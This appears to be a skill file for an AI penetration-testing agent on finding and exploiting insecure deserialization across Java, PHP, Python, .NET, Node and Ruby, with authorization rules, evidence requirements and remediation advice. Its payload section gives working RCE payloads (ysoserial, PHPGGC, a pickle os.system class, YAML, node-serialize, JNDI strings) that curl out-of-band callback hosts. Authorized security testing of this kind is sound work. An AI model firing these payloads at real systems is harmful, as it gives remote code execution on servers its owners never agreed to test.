---
name: deserialization
description: "Canonical insecure deserialization capability: Java (ysoserial), PHP (phpggc), Python (pickle/YAML), .NET (ViewState/BinaryFormatter), Ruby (Marshal.load), JNDI/Log4Shell, phar://, node-serialize. Consolidates 2 sub-skills: exploiting-insecure-deserialization, hunt-deserialization. Use when hunting or validating deserialization-related vulnerabilities."
sources: consolidated, hackerone_public
report_count: 22
---

# DESERIALIZATION — Canonical Capability

## 1. Identity and purpose

This is the single primary executable capability for Insecure Deserialization (CWE-502, OWASP A08:2021 Software and Data Integrity Failures). It consolidates 2 previously separate sub-skills (`exploiting-insecure-deserialization`, `hunt-deserialization`) into one operational entry point while preserving all source content in `references/` and the original sub-skill directories for rollback.

Primary objectives:
- Discover serialized objects in HTTP traffic, cookies, parameters, headers, queues, and caches across Java, PHP, Python, .NET, Ruby, and Node.
- Validate deserialization with out-of-band (OOB) callbacks or timing, then escalate to RCE where authorized.
- Cover gadget chains (ysoserial, PHPGGC, ysoserial.net), JNDI/Log4Shell, phar://, YAML, and node-serialize variants.
- Produce reproducible, impact-rated findings with remediation guidance.

## 2. Scope

In scope:
- Java serialization (`ac ed 00 05` / `rO0AB`), gzip+base64, Apache Shiro `rememberMe`.
- PHP `unserialize()` object injection, `__wakeup`/`__destruct` magic methods, phar:// metadata deserialization.
- Python `pickle`/`marshal`, PyYAML `yaml.load()` (CVE-2017-18342), node-serialize IIFE (CVE-2017-5941).
- .NET `BinaryFormatter`, `ObjectStateFormatter`, ViewState (with/without MAC), remoting.
- Ruby `Marshal.load`/`Marshal.restore` gadget chains.
- JNDI injection / Log4Shell (`${jndi:...}`) class loading.

Out of scope (hand off):
- Pure injection classes (SQLi, command injection, SSTI) → their own capabilities.
- XSS/markup without code execution → `hunt-xss` / `hunt-html-injection`.
- Auth/session flaws unrelated to serialized state → `hunt-auth-bypass` / `hunt-session`.

## 3. Invocation and routing

Use this capability when:
- A target processes serialized data in cookies, API parameters, message queues, cache entries, or hidden form fields.
- Java/PHP/Python/.NET/Ruby/Node serialization markers appear in traffic.
- You are validating deserialization with Burp Suite, ysoserial, PHPGGC, or ysoserial.net.
- A finding involves gadget chains, JNDI/Log4Shell, phar://, or ViewState.

Routing notes:
- Hunting/discovery routes to `references/hunt-deserialization.md` (attack surface, signals, phases, disclosed cases).
- Structured exploitation routes to `references/exploiting-insecure-deserialization.md` (workflow, tools, scenarios, output format).
- Detection agent usage routes to `exploiting-insecure-deserialization/scripts/agent.py` and the api-reference under that sub-skill.

## 4. Inputs and outputs

Inputs:
- Target base URLs, endpoints, cookies, parameters, headers, request templates.
- Optional: Burp Suite project, test accounts, callback host (interactsh/Collaborator).
- Optional: source code access for locating `unserialize`/`Marshal.load`/`pickle.loads`/`yaml.load`.

Outputs:
- Confirmed or refuted deserialization findings with OOB callback or command output proof.
- Serialized format identification, gadget chain and affected library versions.
- Reproduction steps, impact assessment, and remediation guidance.
- False-positive rulings with disproof rationale.

## 5. Preconditions and authorization

- Confirm written authorization and RCE testing scope before any payload execution.
- Use only test accounts and authorized targets; never trigger state changes on real users' data.
- Prefer safe detection first (URLDNS/OOB DNS) before RCE payloads.
- Avoid destructive commands; use `id`/`whoami`/callback proofs unless deeper access is authorized.
- Respect rate limits and stop at account/tenant boundaries; document out-of-scope endpoints.

## 6. Reconnaissance

Recon steps:
1. Spider authenticated sessions and collect all cookies, hidden fields (`__VIEWSTATE`, `__EVENTVALIDATION`), API bodies, WebSocket messages, queue/cache entries.
2. Search traffic for serialization markers: `rO0AB` (Java), `O:...:` (PHP), `\x80\x04` (pickle), `/wEP` (ViewState), `rememberMe` (Shiro).
3. Fingerprint frameworks and libraries (commons-collections, Spring, Hibernate, Laravel, Symfony, Django, ASP.NET, Rails) to select gadget chains.
4. Inspect Content-Type headers (`application/x-java-serialized-object`, `application/octet-stream`, `application/x-yaml`).
5. Enumerate endpoints: `/remoting/`, `/invoker/`, `/jmx-console/`, `/wls-wsat/`, `/hubs/*`, import/load-model APIs.
6. Review source (if available) for `unserialize(`, `Marshal.load`, `pickle.loads`, `yaml.load`, `BinaryFormatter`.
7. Subdomain/DNS inventory when cookies use wildcard domains; check JNDI/Log4Shell candidate inputs (headers, JSON fields).

See `references/hunt-deserialization.md` (attack surface signals, phases).

## 7. Detection methodology

Core detection flow:
1. Identify serialized data locations and classify format (Java/PHP/Python/.NET/Ruby/Node/YAML).
2. Confirm deserialization occurs: modify object (e.g., role escalation) or send a safe probe; observe error/response/time changes.
3. Use OOB detection first (URLDNS DNS callback, interactsh) to prove deserialization without RCE.
4. For each format, select the appropriate gadget chain tool (ysoserial, PHPGGC, ysoserial.net, pickle payload, Marshal gadget).
5. Validate with a clean reproduction (raw HTTP/curl or saved request) and record library versions.
6. For JNDI/Log4Shell, test all user-controlled inputs (headers, body fields) with `${jndi:dns://COLLAB/a}`.

References by phase:
- Hunting/bypasses: `references/hunt-deserialization.md`.
- Exploitation workflow: `references/exploiting-insecure-deserialization.md`.

## 8. Technique selection

Select techniques by observed format/defenses:
- Java serialized object → URLDNS probe (safe), then CommonsCollections/Spring/Hibernate gadgets via ysoserial; base64/gzip as needed.
- Apache Shiro `rememberMe` → default AES key exploit; decrypt/encrypt payload.
- PHP serialized string → object injection (`__destruct`/`__wakeup`); PHPGGC for Laravel/Symfony/WordPress/Monolog; phar:// via filesystem functions even without `unserialize()`.
- Python pickle → `__reduce__` OOB/RCE payload; YAML `!!python/object/apply:os.system`; node-serialize IIFE marker.
- .NET ViewState → check MAC disabled/known machine key; ysoserial.net BinaryFormatter/ObjectStateFormatter gadgets.
- Ruby Marshal → Gem::Requirement/Installer gadgets.
- JNDI/Log4Shell → `${jndi:ldap://...}` via headers/body; LDAP/JNDI exploit kit for class loading.
- Blind deserialization → timing (`sleep`) and OOB DNS/HTTP callbacks.

See `references/hunt-deserialization.md` (chain table, phases) and `references/exploiting-insecure-deserialization.md` (commands).

## 9. Execution steps

1. Establish baseline request for each candidate endpoint/cookie/parameter.
2. Replay with one controlled change at a time; record status, body, timing, headers.
3. Detect format and generate safe probe (URLDNS/OOB) using the matching tool.
4. Confirm deserialization via callback or timing before attempting RCE.
5. Escalate with gadget chain payload; confirm command output/OOB callback.
6. For authorization impact, use two accounts/roles where applicable and confirm execution context (user/privileges).
7. Capture affected library versions and classpath evidence (commons-collections, spring-core, etc.).
8. Stop and document when a vector is not exploitable or out of scope.

## 10. Tool usage

- Java: ysoserial / ysoserial-all.jar, marshalsec, Burp Java Deserialization Scanner.
- PHP: PHPGGC, phpggc, phar polyglot tooling.
- .NET: ysoserial.net (Windows/Mono), ViewState decoders.
- Python: pickle, base64, PyYAML payloads, pickletools.
- Ruby: Marshal gadget research, ruby-advisory-db.
- JNDI: interactsh-client, JNDI-Exploit-Kit, ldap/HTTP callback servers.
- HTTP: Burp Suite (Repeater, Collaborator), curl, Python requests/httpx.
- Detection agent: `exploiting-insecure-deserialization/scripts/agent.py` (scan cookies/body, format detection, probes).
- Evidence: saved requests/responses, OOB callback logs, screenshots, canary values.

See `references/exploiting-insecure-deserialization.md` (tools & systems) and `references/hunt-deserialization.md` (automation).

## 11. Payloads and test cases

Java URLDNS probe:
```bash
java -jar ysoserial.jar URLDNS "http://java-deser.abc123.oast.fun" | base64 -w0
```

Java RCE (CommonsCollections):
```bash
java -jar ysoserial.jar CommonsCollections5 "curl http://abc123.oast.fun/confirm" | base64 -w0
```

PHP object injection / PHPGGC:
```bash
./phpggc Laravel/RCE1 system "id" -b
# Inject into cookie/param:
PAYLOAD=$(./phpggc Laravel/RCE1 system "curl http://abc123.oast.fun/laravel" -b)
curl -s -b "serialized_data=$PAYLOAD" "https://target.example.com/dashboard"
```

PHP phar:// polyglot:
```bash
phpggc -p phar -o poly.jpg Monolog/RCE1 system id
# then reach phar://uploads/poly.jpg/x via any filesystem function
```

Python pickle:
```python
import pickle, base64, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://abc123.oast.fun/pickle-rce',))
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
```

Python YAML:
```bash
curl -s -X POST -H "Content-Type: application/x-yaml" \
  -d "!!python/object/apply:os.system ['curl http://abc123.oast.fun/yaml']" \
  "https://target.example.com/api/config"
```

Node node-serialize:
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://COLLAB/node')}()"}
```

.NET ViewState:
```bash
./ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter \
  -c "curl http://abc123.oast.fun/dotnet-rce" -o base64
```

Log4Shell / JNDI:
```bash
curl -s https://$TARGET/ -H "User-Agent: \${jndi:dns://COLLAB_HOST/ua}"
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"\${jndi:ldap://COLLAB_HOST/a}\"}"
```

Ruby Marshal (detection):
```bash
grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .
```

Additional variants (base64/gzip, Shiro AES, ViewState MAC checks, timing-based blind confirmation) live in `references/exploiting-insecure-deserialization.md` and `references/hunt-deserialization.md`.

## 12. Evidence

Each finding must include:
- Exact request and response (raw HTTP, cookie/param values, body).
- Serialization format identified and marker evidence.
- OOB callback log or command output proving execution.
- Gadget chain and affected library/version (e.g., commons-collections 3.2.1, CVE-2015-7501).
- Authentication context (account/role) and server-side effect.
- Impact assessment and affected scope.

## 13. Reproduction and validation

- Reproduce with curl or a saved raw request in a clean session where possible.
- Validate with safe detection first (URLDNS/OOB DNS), then escalate only if authorized.
- Confirm with two accounts/roles where applicable; verify execution context.
- For blind vectors, confirm via timing or OOB callback; mark refuted if no callback.
- For JNDI, confirm DNS/HTTP callback from the collaborator host.
- Mark as refuted if the payload does not execute or no concrete impact exists.

## 14. False-positive rejection

Reject or downgrade when:
- The serialized value is not actually deserialized server-side (no callback/effect).
- Gadget chain fails against the target's classpath/library versions.
- ViewState MAC is enabled and machine key is unknown; no bypass exists.
- Input is validated/allowlisted (JEP 290 filters, allowlists).
- Error messages are generic and do not indicate deserialization.
- Callback is caused by another component (e.g., image fetch) rather than deserialization.
- Response differences are due to caching, localization, or benign metadata.

## 15. Impact

Impact guidance:
- Critical: RCE via deserialization (Java/PHP/Python/.NET/Ruby/Node) with server process privileges; Log4Shell.
- High: Object injection leading to file write/account takeover/privilege escalation without full RCE.
- Medium: Deserialization causing DoS or limited state manipulation.
- Low: Deserialization marker present but not exploitable; missing hardening without exploit path.

Always tie impact to concrete execution or data loss; "serialized data present" is not impact.

## 16. Reporting

Report template:
- Summary: endpoint/cookie/param, vulnerability type (insecure deserialization), impact.
- Scope/authorization: test window and accounts.
- Steps to reproduce: numbered, minimal (format detection → safe probe → RCE).
- Proof of concept: raw request/response, payload, OOB callback log.
- Affected component: library/version and CVE where applicable.
- Impact: business and data scope, execution context.
- Remediation: avoid deserializing untrusted data; use JSON/protobuf; upgrade libraries; implement filters/allowlists; integrity checks (HMAC); disable dangerous functions (`pickle.loads` on untrusted, `yaml.load` safe loader, `BinaryFormatter`).
- References: OWASP A08:2021, CWE-502, relevant CVEs/advisories.

## 17. Failure modes

- Surface not fully discovered → expand recon (JS bundles, mobile, versions, queues, caches).
- No test account → request credentials or scope clarification; do not bypass without authorization.
- WAF/gateway blocks payloads → try base64/gzip variants, content-type confusion, or parser differentials.
- Rate limiting stops testing → coordinate throttling or test windows.
- Blind deserialization inconclusive → repeat with fresh sessions and timing/OOB diff; mark not confirmed if ambiguous.
- Tooling unavailable (ysoserial/PHPGGC) → install or use marshalsec/agent.py; document limitation.
- JNDI callback not received → verify collaborator host and network egress; test multiple input locations.

## 18. References

All sub-skill and technical-area references are preserved and must resolve:

| Reference | Sub-capability / Area | Load when |
|---|---|---|
| `references/hunt-deserialization.md` | `hunt-deserialization` | Hunting/bypasses, attack surface, phases, disclosed cases |
| `references/exploiting-insecure-deserialization.md` | `exploiting-insecure-deserialization` | Exploitation workflow, tools, scenarios, output format |
| `references/java-jackson-fastjson-xstream.md` | Java Jackson/Fastjson/XStream | Java JSON/XML polymorphic deserialization |
| `references/dotnet-typenamehandling.md` | .NET TypeNameHandling | Newtonsoft/ViewState/.NET deserialization |
| `references/php.md` | PHP | PHP unserialize/phar deserialization |
| `references/python.md` | Python | pickle/yaml/jsonpickle deserialization |
| `references/ruby-psych.md` | Ruby/Psych | Psych/Marshal deserialization |
| `references/go-gob.md` | Go/gob | Go gob/encoding deserialization |
| `references/amf.md` | AMF | AMF remoting deserialization |
| `references/kryo.md` | Kryo | Kryo serialization deserialization |
| `references/hessian.md` | Hessian | Hessian/Burlap deserialization |

Original sub-skills remain intact under `exploiting-insecure-deserialization/` and `hunt-deserialization/` (including `api-reference.md` and `scripts/agent.py` under the former).

## 19. Testing and mastery

- Validate with the capability tests in `tests/test_deserialization_capability.py`.
- Confirm all referenced files resolve and are non-empty.
- Confirm migration map paths/hashes/status are accurate.
- Practice on authorized labs: PortSwigger deserialization, OWASP WebGoat, DVWA, HackTheBox.
- Mastery criteria: independently discover, validate, and report a deserialization finding with full reproduction, gadget chain, library versions, and impact.


## Knowledge sources

- WKS bug classes: deser
- Domain knowledge: deser
- WKS remains the structured source of truth; retrieve and validate items through WKS rather than duplicating the full corpus in this skill.
- Research and learning material is mapped in `stage-a/knowledge-source-map.json` and must be validated before promotion.
